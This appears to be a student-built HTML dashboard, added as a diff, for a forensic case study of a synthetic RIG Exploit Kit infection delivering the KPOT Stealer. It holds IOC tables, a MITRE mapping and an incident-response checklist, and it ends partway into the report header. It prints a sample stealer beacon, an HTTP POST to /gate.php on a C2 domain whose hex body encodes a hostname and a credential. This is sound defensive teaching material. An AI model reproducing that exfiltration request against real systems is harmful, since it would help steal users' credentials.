@@ -1,0 +1,949 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>G66 Forensics | RIG EK & KPOT Stealer Network Analysis</title>
+    <!-- Modern Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <!-- FontAwesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Chart.js -->
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <link rel="stylesheet" href="/static/style.css">
+</head>
+<body class="dark-theme">
+    <div class="soc-layout">
+        <!-- Sidebar Navigation -->
+        <aside class="sidebar">
+            <div class="brand">
+                <div class="brand-icon">
+                    <i class="fa-solid fa-shield-virus"></i>
+                </div>
+                <div class="brand-text">
+                    <span class="brand-title">G66 FORENSICS</span>
+                    <span class="brand-sub">SOC LAB &bull; CA-2</span>
+                </div>
+            </div>
+
+            <div class="sidebar-meta">
+                <div class="case-label">CASE STUDY</div>
+                <div class="case-name">RIG EK &rarr; KPOT Stealer</div>
+                <div class="case-sub">Drive-by Infection Analysis</div>
+            </div>
+
+            <nav class="nav-menu">
+                <button class="nav-item active" data-tab="dashboard">
+                    <i class="fa-solid fa-chart-line"></i>
+                    <span>Dashboard</span>
+                </button>
+                <button class="nav-item" data-tab="pcap">
+                    <i class="fa-solid fa-network-wired"></i>
+                    <span>PCAP & Packets</span>
+                    <span class="badge-count" id="nav-packet-count">0</span>
+                </button>
+                <button class="nav-item" data-tab="iocs">
+                    <i class="fa-solid fa-crosshairs"></i>
+                    <span>IOC Threat Intel</span>
+                    <span class="badge-count badge-alert" id="nav-ioc-count">8</span>
+                </button>
+                <button class="nav-item" data-tab="timeline">
+                    <i class="fa-solid fa-timeline"></i>
+                    <span>Attack Timeline</span>
+                </button>
+                <button class="nav-item" data-tab="investigation">
+                    <i class="fa-solid fa-microscope"></i>
+                    <span>Investigation & MITRE</span>
+                </button>
+                <button class="nav-item" data-tab="ir">
+                    <i class="fa-solid fa-clipboard-check"></i>
+                    <span>Incident Response</span>
+                </button>
+                <button class="nav-item" data-tab="report">
+                    <i class="fa-solid fa-file-contract"></i>
+                    <span>Executive Report</span>
+                </button>
+            </nav>
+
+            <div class="sidebar-footer">
+                <div class="system-status">
+                    <span class="pulse-dot"></span>
+                    <span id="scapy-status-text">Forensic Engine Active</span>
+                </div>
+                <div class="student-credits">
+                    <span>Group G66 &bull; B.Tech Cyber Security</span>
+                </div>
+            </div>
+        </aside>
+
+        <!-- Main Content Area -->
+        <main class="main-content">
+            <!-- Top SOC Navbar -->
+            <header class="topbar">
+                <div class="topbar-left">
+                    <button id="mobile-menu-btn" class="icon-btn mobile-only"><i class="fa-solid fa-bars"></i></button>
+                    <div class="page-title-box">
+                        <h1 id="page-heading">Network Forensic SOC Dashboard</h1>
+                        <p class="text-muted">Investigation of Drive-by Malware Delivery & C2 Exfiltration</p>
+                    </div>
+                </div>
+
+                <div class="topbar-right">
+                    <!-- Status Indicator Badge -->
+                    <div id="mode-badge" class="mode-pill mode-demo">
+                        <i class="fa-solid fa-flask"></i>
+                        <span id="mode-text">DEMO DATA (SYNTHETIC)</span>
+                    </div>
+
+                    <div class="quick-actions">
+                        <button class="btn btn-secondary btn-sm" id="btn-load-demo" title="Load Synthetic Case Study Dataset">
+                            <i class="fa-solid fa-rotate-left"></i> Demo Data
+                        </button>
+                        <button class="btn btn-primary btn-sm" id="btn-trigger-upload">
+                            <i class="fa-solid fa-upload"></i> Upload PCAP
+                        </button>
+                        <button class="btn btn-outline btn-sm" id="btn-reset-data" title="Clear current analysis">
+                            <i class="fa-solid fa-trash-can"></i>
+                        </button>
+                    </div>
+                </div>
+            </header>
+
+            <!-- Evidence Integrity Status Bar -->
+            <section class="evidence-bar" id="evidence-bar">
+                <div class="evidence-item">
+                    <i class="fa-solid fa-file-waveform"></i>
+                    <span class="label">Target Artifact:</span>
+                    <span class="val" id="bar-filename">Synthetic_RIG_KPOT_Case_Study.pcap</span>
+                </div>
+                <div class="evidence-item">
+                    <i class="fa-solid fa-fingerprint"></i>
+                    <span class="label">SHA-256 Hash:</span>
+                    <span class="val font-mono" id="bar-filehash" title="Click to copy">e3b0c44298fc1c149afbf4c8996fb924...</span>
+                </div>
+                <div class="evidence-item">
+                    <i class="fa-solid fa-database"></i>
+                    <span class="label">Size:</span>
+                    <span class="val" id="bar-filesize">142.8 KB</span>
+                </div>
+                <div class="evidence-item">
+                    <i class="fa-regular fa-clock"></i>
+                    <span class="label">Ingested:</span>
+                    <span class="val" id="bar-timestamp">2026-10-10 13:45 UTC</span>
+                </div>
+            </section>
+
+            <!-- Container for Tab Panes -->
+            <div class="tab-container">
+
+                <!-- 1. DASHBOARD VIEW -->
+                <section class="tab-pane active" id="pane-dashboard">
+                    <!-- Warning / Info Banner -->
+                    <div class="soc-banner banner-warning">
+                        <i class="fa-solid fa-triangle-exclamation"></i>
+                        <div>
+                            <strong>Forensic Investigation Notice:</strong> 
+                            <span id="banner-notice-text">Currently analyzing synthetic educational dataset simulating host 10.0.76.109 compromise via RIG Exploit Kit. Reference indicators are displayed for correlation.</span>
+                        </div>
+                    </div>
+
+                    <!-- KPI Statistics Grid -->
+                    <div class="kpi-grid">
+                        <div class="kpi-card">
+                            <div class="kpi-header">
+                                <span class="kpi-title">TOTAL PACKETS</span>
+                                <div class="kpi-icon cyan"><i class="fa-solid fa-boxes-stacked"></i></div>
+                            </div>
+                            <div class="kpi-value" id="kpi-packets">0</div>
+                            <div class="kpi-subtext"><span class="badge-soft">100% Ingested</span> In active buffer</div>
+                        </div>
+
+                        <div class="kpi-card">
+                            <div class="kpi-header">
+                                <span class="kpi-title">UNIQUE SOURCE IPs</span>
+                                <div class="kpi-icon blue"><i class="fa-solid fa-desktop"></i></div>
+                            </div>
+                            <div class="kpi-value" id="kpi-src-ips">0</div>
+                            <div class="kpi-subtext text-cyan">Including 10.0.76.109</div>
+                        </div>
+
+                        <div class="kpi-card">
+                            <div class="kpi-header">
+                                <span class="kpi-title">UNIQUE DEST IPs</span>
+                                <div class="kpi-icon purple"><i class="fa-solid fa-server"></i></div>
+                            </div>
+                            <div class="kpi-value" id="kpi-dst-ips">0</div>
+                            <div class="kpi-subtext text-purple">External & Internal targets</div>
+                        </div>
+
+                        <div class="kpi-card">
+                            <div class="kpi-header">
+                                <span class="kpi-title">HTTP SESSIONS</span>
+                                <div class="kpi-icon orange"><i class="fa-solid fa-globe"></i></div>
+                            </div>
+                            <div class="kpi-value" id="kpi-http">0</div>
+                            <div class="kpi-subtext text-orange">Web & C2 Beacons</div>
+                        </div>
+
+                        <div class="kpi-card kpi-alert">
+                            <div class="kpi-header">
+                                <span class="kpi-title">SUSPICIOUS EVENTS</span>
+                                <div class="kpi-icon red"><i class="fa-solid fa-triangle-exclamation"></i></div>
+                            </div>
+                            <div class="kpi-value text-red" id="kpi-suspicious">0</div>
+                            <div class="kpi-subtext text-red">High-severity alerts</div>
+                        </div>
+                    </div>
+
+                    <!-- Charts Row -->
+                    <div class="charts-row">
+                        <div class="panel chart-panel">
+                            <div class="panel-header">
+                                <h3><i class="fa-solid fa-chart-pie"></i> Protocol Distribution</h3>
+                                <span class="panel-tag">L3/L4 Breakdown</span>
+                            </div>
+                            <div class="panel-body chart-wrapper">
+                                <canvas id="chart-protocol"></canvas>
+                            </div>
+                        </div>
+
+                        <div class="panel chart-panel">
+                            <div class="panel-header">
+                                <h3><i class="fa-solid fa-chart-line"></i> Network Traffic Volume</h3>
+                                <span class="panel-tag">Packets per Interval</span>
+                            </div>
+                            <div class="panel-body chart-wrapper">
+                                <canvas id="chart-timeline"></canvas>
+                            </div>
+                        </div>
+
+                        <div class="panel chart-panel">
+                            <div class="panel-header">
+                                <h3><i class="fa-solid fa-chart-bar"></i> Top Talker IP Nodes</h3>
+                                <span class="panel-tag">Endpoint Volume</span>
+                            </div>
+                            <div class="panel-body chart-wrapper">
+                                <canvas id="chart-top-ips"></canvas>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Recent Suspicious Events Table -->
+                    <div class="panel">
+                        <div class="panel-header">
+                            <div>
+                                <h3><i class="fa-solid fa-shield-halved"></i> Flagged Malicious & Suspicious Events</h3>
+                                <p class="panel-sub">Automated signature and heuristic detections matching RIG EK & KPOT Stealer profile</p>
+                            </div>
+                            <button class="btn btn-secondary btn-sm" onclick="switchTab('pcap')">
+                                View All Packets <i class="fa-solid fa-arrow-right"></i>
+                            </button>
+                        </div>
+                        <div class="panel-body p-0">
+                            <div class="table-responsive">
+                                <table class="soc-table" id="table-recent-events">
+                                    <thead>
+                                        <tr>
+                                            <th>#</th>
+                                            <th>Timestamp</th>
+                                            <th>Source IP</th>
+                                            <th>Destination IP</th>
+                                            <th>Protocol</th>
+                                            <th>Security Alert Reason</th>
+                                            <th>Action</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody id="tbody-recent-events">
+                                        <!-- Populated via JS -->
+                                    </tbody>
+                                </table>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- 2. PCAP & PACKET INSPECTION VIEW -->
+                <section class="tab-pane" id="pane-pcap">
+                    <!-- Drag and Drop Upload Card -->
+                    <div class="panel upload-panel" id="drop-zone">
+                        <input type="file" id="pcap-file-input" accept=".pcap,.pcapng" style="display:none">
+                        <div class="upload-inner">
+                            <div class="upload-icon">
+                                <i class="fa-solid fa-cloud-arrow-up"></i>
+                            </div>
+                            <div class="upload-text">
+                                <h3>Upload PCAP / PCAPNG Network Capture File</h3>
+                                <p class="text-muted">Drag and drop file here or <span class="text-cyan cursor-pointer" onclick="document.getElementById('pcap-file-input').click()">browse your local computer</span></p>
+                                <span class="upload-hint">Supported formats: <strong>.pcap</strong>, <strong>.pcapng</strong> (Max 50MB) &bull; Processed strictly locally</span>
+                            </div>
+                            <div class="upload-action">
+                                <button class="btn btn-primary" onclick="document.getElementById('pcap-file-input').click()">
+                                    <i class="fa-solid fa-folder-open"></i> Select File
+                                </button>
+                            </div>
+                        </div>
+                        <div class="upload-progress-bar" id="upload-progress-bar" style="display:none;">
+                            <div class="progress-fill" id="upload-progress-fill"></div>
+                        </div>
+                    </div>
+
+                    <!-- Packet Controls & Filters -->
+                    <div class="panel">
+                        <div class="panel-header flex-wrap gap-2">
+                            <div class="filter-group">
+                                <div class="search-box">
+                                    <i class="fa-solid fa-magnifying-glass"></i>
+                                    <input type="text" id="filter-search" placeholder="Search IP, Port, Info, Domain, /gate.php...">
+                                </div>
+                                <select id="filter-protocol" class="soc-select">
+                                    <option value="ALL">All Protocols</option>
+                                    <option value="HTTP">HTTP</option>
+                                    <option value="DNS">DNS</option>
+                                    <option value="TCP">TCP</option>
+                                    <option value="UDP">UDP</option>
+                                    <option value="TLS/HTTPS">TLS/HTTPS</option>
+                                    <option value="ARP">ARP</option>
+                                </select>
+                                <input type="text" id="filter-src" class="soc-input" placeholder="Src IP (e.g. 10.0.76.109)">
+                                <input type="text" id="filter-dst" class="soc-input" placeholder="Dst IP (e.g. 37.46.135.170)">
+                                <label class="checkbox-label">
+                                    <input type="checkbox" id="filter-suspicious-only">
+                                    <span>Flagged Only</span>
+                                </label>
+                            </div>
+                            <div class="export-actions">
+                                <button class="btn btn-secondary btn-sm" id="btn-export-packets-csv">
+                                    <i class="fa-solid fa-file-csv"></i> Export CSV
+                                </button>
+                            </div>
+                        </div>
+
+                        <!-- Packets Table -->
+                        <div class="panel-body p-0">
+                            <div class="table-responsive" style="max-height: 580px; overflow-y: auto;">
+                                <table class="soc-table font-mono-table" id="table-packets">
+                                    <thead>
+                                        <tr>
+                                            <th style="width: 50px;">No.</th>
+                                            <th style="width: 170px;">Timestamp</th>
+                                            <th style="width: 140px;">Source IP</th>
+                                            <th style="width: 140px;">Destination IP</th>
+                                            <th style="width: 80px;">Proto</th>
+                                            <th style="width: 70px;">Length</th>
+                                            <th>Summary Information</th>
+                                            <th style="width: 100px;">Threat Status</th>
+                                            <th style="width: 60px;">Action</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody id="tbody-packets">
+                                        <!-- Dynamically generated packets -->
+                                    </tbody>
+                                </table>
+                            </div>
+                            <div class="table-footer">
+                                <span id="packets-count-label">Showing 0 matching packets</span>
+                                <span class="text-muted">Click row for full payload hex & metadata dissection</span>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- 3. INDICATORS OF COMPROMISE (IOCs) VIEW -->
+                <section class="tab-pane" id="pane-iocs">
+                    <!-- Warning / Guidance Banner -->
+                    <div class="soc-banner banner-info">
+                        <i class="fa-solid fa-shield-halved"></i>
+                        <div>
+                            <strong>SOC Analytical Guidance:</strong> 
+                            These reference indicators are derived from Group G66 Case Study documentation. The automated engine cross-checks each indicator against currently ingested packets to mark whether it was actively observed or remains an uncorroborated reference lead.
+                        </div>
+                    </div>
+
+                    <div class="soc-banner banner-danger mb-3">
+                        <i class="fa-solid fa-ban"></i>
+                        <div>
+                            <strong>Safety Protocol:</strong> Do not contact suspicious hosts, resolve external malicious domains in production, or attempt to download live exploit kits.
+                        </div>
+                    </div>
+
+                    <!-- IOC Table Panel -->
+                    <div class="panel">
+                        <div class="panel-header">
+                            <div>
+                                <h3><i class="fa-solid fa-list-check"></i> Case Study Reference Indicators & Validation Status</h3>
+                                <p class="panel-sub">Rigorous forensic corroboration between documented threat intel and network capture</p>
+                            </div>
+                            <div class="export-actions">
+                                <button class="btn btn-secondary btn-sm" id="btn-export-iocs-csv">
+                                    <i class="fa-solid fa-file-csv"></i> Export IOCs CSV
+                                </button>
+                            </div>
+                        </div>
+                        <div class="panel-body p-0">
+                            <div class="table-responsive">
+                                <table class="soc-table" id="table-iocs">
+                                    <thead>
+                                        <tr>
+                                            <th>ID</th>
+                                            <th>Type</th>
+                                            <th>Indicator Value</th>
+                                            <th>Category / Role</th>
+                                            <th>Reported Source</th>
+                                            <th>Severity</th>
+                                            <th>Observed Matches</th>
+                                            <th>Validation Status</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody id="tbody-iocs">
+                                        <!-- Populated via JS -->
+                                    </tbody>
+                                </table>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- IOC Detailed Intelligence Cards -->
+                    <div class="grid-2-col mt-3">
+                        <div class="panel">
+                            <div class="panel-header">
+                                <h3><i class="fa-solid fa-laptop-code"></i> Infected Endpoint Profile</h3>
+                            </div>
+                            <div class="panel-body">
+                                <div class="intel-spec-grid">
+                                    <div class="spec-label">Assigned IP:</div>
+                                    <div class="spec-value text-cyan font-mono">10.0.76.109</div>
+                                    <div class="spec-label">Computer Name:</div>
+                                    <div class="spec-value font-mono">BANGKOK-8AC2-PC</div>
+                                    <div class="spec-label">MAC Address:</div>
+                                    <div class="spec-value font-mono">78:2b:cb:d4:a5:fe</div>
+                                    <div class="spec-label">Operating System:</div>
+                                    <div class="spec-value">Windows Workstation (Legacy Browser Client)</div>
+                                    <div class="spec-label">Status:</div>
+                                    <div class="spec-value"><span class="badge badge-critical">Compromised</span></div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="panel">
+                            <div class="panel-header">
+                                <h3><i class="fa-solid fa-skull-crossbones"></i> Threat Actor Infrastructure</h3>
+                            </div>
+                            <div class="panel-body">
+                                <div class="intel-spec-grid">
+                                    <div class="spec-label">Exploit Kit IP:</div>
+                                    <div class="spec-value text-red font-mono">37.46.135.170 (RIG Exploit Host)</div>
+                                    <div class="spec-label">Malware C2 IP:</div>
+                                    <div class="spec-value text-red font-mono">8.209.83.76 (KPOT Stealer Server)</div>
+                                    <div class="spec-label">C2 Domain:</div>
+                                    <div class="spec-value text-red font-mono">fghjkmgru34.site</div>
+                                    <div class="spec-label">Exfiltration Path:</div>
+                                    <div class="spec-value text-red font-mono">/gate.php (HTTP POST)</div>
+                                    <div class="spec-label">Payload:</div>
+                                    <div class="spec-value">KPOT Stealer Infostealer Trojan</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- 4. ATTACK TIMELINE & NETWORK GRAPH VIEW -->
+                <section class="tab-pane" id="pane-timeline">
+                    <!-- Conceptual Attack Chain Header -->
+                    <div class="attack-chain-box">
+                        <div class="chain-title">CONCEPTUAL ATTACK CHAIN PHASES</div>
+                        <div class="chain-steps">
+                            <div class="chain-step">
+                                <div class="step-num">1</div>
+                                <div class="step-name">Compromised Webpage</div>
+                                <div class="step-desc">Malicious Iframe / Ad</div>
+                            </div>
+                            <div class="chain-arrow">&rarr;</div>
+                            <div class="chain-step">
+                                <div class="step-num">2</div>
+                                <div class="step-name">RIG Exploit Kit</div>
+                                <div class="step-desc">Client Profiling & Exploit</div>
+                            </div>
+                            <div class="chain-arrow">&rarr;</div>
+                            <div class="chain-step">
+                                <div class="step-num">3</div>
+                                <div class="step-name">Malware Delivery</div>
+                                <div class="step-desc">Drop payload.bin</div>
+                            </div>
+                            <div class="chain-arrow">&rarr;</div>
+                            <div class="chain-step">
+                                <div class="step-num">4</div>
+                                <div class="step-name">KPOT Execution</div>
+                                <div class="step-desc">Credential Harvesting</div>
+                            </div>
+                            <div class="chain-arrow">&rarr;</div>
+                            <div class="chain-step">
+                                <div class="step-num">5</div>
+                                <div class="step-name">C2 Exfiltration</div>
+                                <div class="step-desc">POST /gate.php</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Interactive Network Communication Visualizer Canvas -->
+                    <div class="panel mt-3">
+                        <div class="panel-header">
+                            <div>
+                                <h3><i class="fa-solid fa-project-diagram"></i> Network Node Communication Graph</h3>
+                                <p class="panel-sub">Visual representation of infected endpoint connections to delivery and command servers</p>
+                            </div>
+                            <span class="panel-tag">Interactive Topology</span>
+                        </div>
+                        <div class="panel-body text-center p-2">
+                            <div class="canvas-container">
+                                <canvas id="network-graph-canvas" width="900" height="340"></canvas>
+                            </div>
+                            <div class="graph-legend">
+                                <span class="legend-item"><span class="legend-color cyan-bg"></span> Victim Client (10.0.76.109)</span>
+                                <span class="legend-item"><span class="legend-color orange-bg"></span> Compromised Referral Site</span>
+                                <span class="legend-item"><span class="legend-color red-bg"></span> RIG Exploit Host (37.46.135.170)</span>
+                                <span class="legend-item"><span class="legend-color purple-bg"></span> KPOT C2 Host (8.209.83.76)</span>
+                                <span class="legend-item"><span class="legend-color green-bg"></span> Internal DNS Gateway</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Chronological Timeline Items -->
+                    <div class="panel mt-3">
+                        <div class="panel-header">
+                            <div>
+                                <h3><i class="fa-solid fa-clock-rotate-left"></i> Chronological Investigation Timeline</h3>
+                                <p class="panel-sub">Distinguishing directly observed packet evidence from analyst interpretation</p>
+                            </div>
+                        </div>
+                        <div class="panel-body">
+                            <div class="timeline-container" id="timeline-flow">
+                                <!-- Dynamic timeline nodes -->
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- 5. INVESTIGATION & MITRE ATT&CK FRAMEWORKS VIEW -->
+                <section class="tab-pane" id="pane-investigation">
+                    <!-- NIST SP 800-86 Summary -->
+                    <div class="nist-grid">
+                        <div class="nist-card">
+                            <div class="nist-step">PHASE 1</div>
+                            <div class="nist-title">Collection & Preservation</div>
+                            <div class="nist-desc">Capture raw traffic (.pcap), compute SHA-256 evidence integrity hash, isolate network segment.</div>
+                        </div>
+                        <div class="nist-card">
+                            <div class="nist-step">PHASE 2</div>
+                            <div class="nist-title">Examination</div>
+                            <div class="nist-desc">Filter packets by victim IP (10.0.76.109), extract L7 protocols, dissect DNS queries and HTTP payloads.</div>
+                        </div>
+                        <div class="nist-card">
+                            <div class="nist-step">PHASE 3</div>
+                            <div class="nist-title">Analysis & Correlation</div>
+                            <div class="nist-desc">Correlate drive-by redirect, RIG EK landing token, binary download, and outbound POST to /gate.php.</div>
+                        </div>
+                        <div class="nist-card">
+                            <div class="nist-step">PHASE 4</div>
+                            <div class="nist-title">Reporting & Action</div>
+                            <div class="nist-desc">Document confirmed IOCs, map MITRE ATT&CK techniques, provide remediation checklist.</div>
+                        </div>
+                    </div>
+
+                    <!-- Dissected Threat Analysis: HTTP POST /gate.php -->
+                    <div class="panel mt-3">
+                        <div class="panel-header">
+                            <div>
+                                <h3><i class="fa-solid fa-code"></i> Deep Protocol Dissection: KPOT Stealer C2 Beacon</h3>
+                                <p class="panel-sub">Forensic breakdown of HTTP POST request to /gate.php</p>
+                            </div>
+                            <span class="badge badge-critical">C2 Traffic Confirmed</span>
+                        </div>
+                        <div class="panel-body">
+                            <div class="code-dissection">
+                                <pre><code><span class="hl-method">POST</span> <span class="hl-path">/gate.php</span> <span class="hl-proto">HTTP/1.1</span>
+<span class="hl-header">Host:</span> <span class="hl-val">fghjkmgru34.site</span>
+<span class="hl-header">User-Agent:</span> <span class="hl-val">Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)</span>
+<span class="hl-header">Content-Type:</span> <span class="hl-val">application/x-www-form-urlencoded</span>
+<span class="hl-header">Content-Length:</span> <span class="hl-val">942</span>
+<span class="hl-header">Connection:</span> <span class="hl-val">Close</span>
+
+<span class="hl-payload">data=7B22686F7374223A2242414E474B4F4B2D384143322D5043222C2275736572223A2256696374696D222C226372656473223A5B7B2275726C223A2268747470733A2F2F6D61696C2E636F72702E6E6574222C2275223A2261646D696E222C2270223A22537570657253656372657421227D5D7D</span></code></pre>
+                            </div>
+                            <div class="dissection-notes mt-2">
+                                <div class="note-item"><i class="fa-solid fa-circle-info text-cyan"></i> <strong>User-Agent Anomaly:</strong> Outdated MSIE 6.0 User-Agent generated by malware hardcoded header, mismatching modern browser patterns.</div>
+                                <div class="note-item"><i class="fa-solid fa-circle-info text-cyan"></i> <strong>Payload Hex Decoding:</strong> Hex stream decodes to JSON telemetry containing victim hostname <code>BANGKOK-8AC2-PC</code> and stolen browser credentials.</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- MITRE ATT&CK Matrix -->
+                    <div class="panel mt-3">
+                        <div class="panel-header">
+                            <div>
+                                <h3><i class="fa-solid fa-chess"></i> MITRE ATT&CK Framework Mapping</h3>
+                                <p class="panel-sub">Rigorous alignment with Enterprise ATT&CK matrix based on observed evidence vs. analytical leads</p>
+                            </div>
+                        </div>
+                        <div class="panel-body p-0">
+                            <div class="table-responsive">
+                                <table class="soc-table" id="table-mitre">
+                                    <thead>
+                                        <tr>
+                                            <th>Tactic</th>
+                                            <th>Technique ID</th>
+                                            <th>Technique Name</th>
+                                            <th>Evidence / Investigative Lead</th>
+                                            <th>Confidence Level</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody id="tbody-mitre">
+                                        <!-- Loaded dynamically -->
+                                    </tbody>
+                                </table>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Analyst Notes Section -->
+                    <div class="panel mt-3">
+                        <div class="panel-header">
+                            <h3><i class="fa-solid fa-pen-to-square"></i> Forensic Analyst Notes & Case Log</h3>
+                            <button class="btn btn-secondary btn-sm" id="btn-save-notes"><i class="fa-solid fa-floppy-disk"></i> Save Notes</button>
+                        </div>
+                        <div class="panel-body">
+                            <textarea id="analyst-notes-input" class="soc-textarea" rows="4" placeholder="Enter custom forensic observations, case notes, or investigation hypothesis..."></textarea>
+                            <span class="text-muted text-sm" id="notes-status-text">Notes stored in session buffer</span>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- 6. INCIDENT RESPONSE PLAYBOOK VIEW -->
+                <section class="tab-pane" id="pane-ir">
+                    <div class="ir-header-card">
+                        <div class="ir-header-info">
+                            <h2>Interactive Incident Response Checklist</h2>
+                            <p class="text-muted">NIST SP 800-61 Rev 2 Incident Containment, Eradication & Recovery Workflow</p>
+                        </div>
+                        <div class="progress-box">
+                            <div class="progress-label">
+                                <span>Checklist Completion</span>
+                                <span id="ir-percent">0%</span>
+                            </div>
+                            <div class="progress-bar-bg">
+                                <div class="progress-bar-fill" id="ir-progress-fill" style="width: 0%;"></div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="checklist-grid mt-3">
+                        <div class="checklist-card">
+                            <div class="checklist-item">
+                                <input type="checkbox" id="ir-step-1" class="ir-checkbox">
+                                <label for="ir-step-1">
+                                    <span class="step-num">Step 1</span>
+                                    <span class="step-title">Preserve forensic evidence and calculate SHA-256 hash</span>
+                                    <span class="step-desc">Export raw PCAP, document hardware MAC (78:2b:cb:d4:a5:fe), and compute cryptographic verification hash.</span>
+                                </label>
+                            </div>
+                            <div class="checklist-item">
+                                <input type="checkbox" id="ir-step-2" class="ir-checkbox">
+                                <label for="ir-step-2">
+                                    <span class="step-num">Step 2</span>
+                                    <span class="step-title">Identify the affected endpoint</span>
+                                    <span class="step-desc">Confirm IP 10.0.76.109 correlates with hostname BANGKOK-8AC2-PC via DHCP and directory records.</span>
+                                </label>
+                            </div>
+                            <div class="checklist-item">
+                                <input type="checkbox" id="ir-step-3" class="ir-checkbox">
+                                <label for="ir-step-3">
+                                    <span class="step-num">Step 3</span>
+                                    <span class="step-title">Isolate the affected system from enterprise network</span>
+                                    <span class="step-desc">Disable switch port or apply endpoint isolation via EDR to prevent lateral movement.</span>
+                                </label>
+                            </div>
+                            <div class="checklist-item">
+                                <input type="checkbox" id="ir-step-4" class="ir-checkbox">
+                                <label for="ir-step-4">
+                                    <span class="step-num">Step 4</span>
+                                    <span class="step-title">Investigate related network activity</span>
+                                    <span class="step-desc">Inspect firewall logs for secondary connections to 37.46.135.170 and 8.209.83.76 across all subnets.</span>
+                                </label>
+                            </div>
+                            <div class="checklist-item">
+                                <input type="checkbox" id="ir-step-5" class="ir-checkbox">
+                                <label for="ir-step-5">
+                                    <span class="step-num">Step 5</span>
+                                    <span class="step-title">Validate and block confirmed malicious indicators</span>
+                                    <span class="step-desc">Apply perimeter firewall blocks on 37.46.135.170 & 8.209.83.76, sinkhole domain fghjkmgru34.site at internal DNS resolvers.</span>
+                                </label>
+                            </div>
+                            <div class="checklist-item">
+                                <input type="checkbox" id="ir-step-6" class="ir-checkbox">
+                                <label for="ir-step-6">
+                                    <span class="step-num">Step 6</span>
+                                    <span class="step-title">Scan and clean affected systems</span>
+                                    <span class="step-desc">Perform full offline disk and memory scan for KPOT Stealer persistence keys, scheduled tasks, and temp binaries.</span>
+                                </label>
+                            </div>
+                            <div class="checklist-item">
+                                <input type="checkbox" id="ir-step-7" class="ir-checkbox">
+                                <label for="ir-step-7">
+                                    <span class="step-num">Step 7</span>
+                                    <span class="step-title">Reset potentially compromised credentials</span>
+                                    <span class="step-desc">Revoke active session tokens, force password reset for user accounts stored on BANGKOK-8AC2-PC, enable MFA.</span>
+                                </label>
+                            </div>
+                            <div class="checklist-item">
+                                <input type="checkbox" id="ir-step-8" class="ir-checkbox">
+                                <label for="ir-step-8">
+                                    <span class="step-num">Step 8</span>
+                                    <span class="step-title">Monitor for recurring suspicious activity</span>
+                                    <span class="step-desc">Deploy high-fidelity SIEM detection rules for outbound HTTP POST requests matching /gate.php path pattern.</span>
+                                </label>
+                            </div>
+                            <div class="checklist-item">
+                                <input type="checkbox" id="ir-step-9" class="ir-checkbox">
+                                <label for="ir-step-9">
+                                    <span class="step-num">Step 9</span>
+                                    <span class="step-title">Document findings and recovery actions</span>
+                                    <span class="step-desc">Finalize post-incident report, update threat intelligence repository, conduct lessons-learned debrief.</span>
+                                </label>
+                            </div>
+                        </div>
+
+                        <!-- Recommendations Pillar Cards -->
+                        <div class="recs-column">
+                            <div class="panel">
+                                <div class="panel-header">
+                                    <h3><i class="fa-solid fa-shield"></i> Hardening Recommendations</h3>
+                                </div>
+                                <div class="panel-body">
+                                    <div class="rec-card">
+                                        <div class="rec-title"><i class="fa-solid fa-wrench text-cyan"></i> Patch Management</div>
+                                        <p>Keep web browsers, runtimes, and document viewers patched to eliminate known memory-corruption vulnerabilities exploited by RIG EK.</p>
+                                    </div>
+                                    <div class="rec-card">
+                                        <div class="rec-title"><i class="fa-solid fa-shield-virus text-purple"></i> Endpoint Protection (EDR)</div>
+                                        <p>Enforce behavioral monitoring and script-blocking policies (AMSI) to intercept obfuscated scripts and unauthorized credential-vault access.</p>
+                                    </div>
+                                    <div class="rec-card">
+                                        <div class="rec-title"><i class="fa-solid fa-network-wired text-blue"></i> Egress Filtering & DNS Sinkholing</div>
+                                        <p>Restrict workstation direct outbound HTTP/S to authorized web proxies and implement automated protective DNS filtering.</p>
+                                    </div>
+                                    <div class="rec-card">
+                                        <div class="rec-title"><i class="fa-solid fa-user-lock text-orange"></i> Credential & Session Hygiene</div>
+                                        <p>Prohibit storing unencrypted high-privilege passwords in browser vaults; mandate hardware token MFA across all enterprise identities.</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- 7. EXECUTIVE REPORT VIEW -->
+                <section class="tab-pane" id="pane-report">
+                    <div class="report-actions-bar no-print">
+                        <div>
+                            <span class="text-muted">Ready for Academic Submission & SOC Briefing</span>
+                        </div>
+                        <button class="btn btn-primary" onclick="window.print()">
+                            <i class="fa-solid fa-print"></i> Print / Save as PDF
+                        </button>
+                    </div>
+
+                    <div class="report-paper">
+                        <!-- Report Header -->
+                        <div class="report-header">
+                            <div class="report-brand">
+                                <h2>CYBER FORENSICS LABORATORY REPORT</h2>
+                                <div class="report-academic">GROUP G66 &bull; B.TECH CYBER SECURITY &bull; CA-2 CASE STUDY</div>
+                            </div>
+                            <div class="report-meta text-right">
+                                <div><strong>Date:</strong> <span id="rep-date">2026-10-10</span></div>
